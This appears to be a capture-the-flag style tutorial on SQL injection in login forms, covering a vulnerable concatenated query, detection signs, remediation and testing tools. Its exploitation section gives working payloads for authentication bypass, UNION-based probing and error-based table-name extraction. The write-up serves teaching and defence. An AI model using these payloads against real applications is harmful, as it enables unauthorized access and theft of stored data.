---
title: SQL Injection in Login Forms
category: web
techniques: ["sql injection", "authentication bypass", "union-based"]
difficulty: easy
author: CTF Writer
year: 2024
tags: ["web", "sqli", "login"]
---

# SQL Injection in Login Forms

## Challenge Description
A vulnerable login form that accepts user input and constructs SQL queries without proper sanitization.

## Vulnerability Analysis
The application takes username and password from a login form and directly concatenates them into a SQL query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

This is vulnerable to SQL injection attacks because user input is not parameterized or sanitized.

## Exploitation Technique

### Basic Authentication Bypass
The classic `' OR '1'='1` payload can bypass authentication:

```
Username: admin' OR '1'='1' --
Password: anything
```

This results in:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'
```

The `--` comments out the rest of the query, making the password check irrelevant.

### Union-Based Injection
To extract data from other tables, use UNION SELECT:

```
Username: admin' UNION SELECT 1,2,3,4 -- 
Password: anything
```

### Error-Based Injection
Force database errors to leak information:

```
Username: admin' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
```

## Detection Indicators
- Forms that don't use parameterized queries
- Error messages revealing SQL syntax
- Input fields directly used in database queries
- Legacy applications using string concatenation

## Remediation
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Use ORM frameworks that handle SQL escaping
- Apply principle of least privilege to database accounts
- Implement web application firewalls (WAF)

## Tools
- sqlmap for automated SQL injection testing
- Burp Suite for manual testing
- OWASP ZAP for security scanning
